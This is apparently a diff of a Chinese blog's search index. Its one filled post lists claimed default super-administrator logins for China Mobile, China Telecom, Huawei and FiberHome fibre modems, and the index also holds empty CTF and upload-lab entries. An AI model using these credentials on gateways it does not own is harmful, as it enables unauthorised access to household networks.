         <content type="html"><![CDATA[<p>登陆中国移动智能网关管理员账号。</p><p>一般来说都在背面，如果接触不到路由器可使用超级用户名登录</p><p>超级账号：CMCCAdmin 超级密码：aDm8H%MdA</p><p>超级用户名:telecomadmin 超级密码:nE7jA%5m</p><p>用户名 telecomadmin 密码 admintelecom</p><p>超级用户名 : fiberhomehg2×0 超级密码 : hg2×0</p><p>超级帐户名是：admin 密码：Cmcc10086#</p><p>我的设备密码是第一个用户名：CMCCAdmin 密码：aDm8H%MdA</p><p>如果你的不是第一个，可以试试其他账号。也可以找给你安装宽带的人员要，他们都有密码的。</p><p>登陆移动网关默认是：192.168.1.1 在猫的背面有介绍登陆地址</p><p>电信光猫超级账号telecomadmin<br>电信光猫超级密码nE7jA%5m<br>华为无运营商标超级账号telecomadmin<br>华为无运营商标超级密码admintelecom<br>移动光猫超级账号CMCCAdmin<br>移动光猫超级密码aDm8H%MdA</p>]]></content>
       
@@ -38,7 +390,7 @@
       
       <categories>
           
-          <category> Web </category>
+          <category> Web安全 </category>
           
       </categories>
       
@@ -46,6 +398,58 @@
         <tags>
             
             <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>buuctf</title>
+      <link href="2021/02/28/ctf/buuctf/"/>
+      <url>2021/02/28/ctf/buuctf/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>upload-labs靶场</title>
+      <link href="2021/02/28/web-an-quan/upload-labs-ba-chang/"/>
+      <url>2021/02/28/web-an-quan/upload-labs-ba-chang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 文件上传 </tag>
             
         </tags>
       
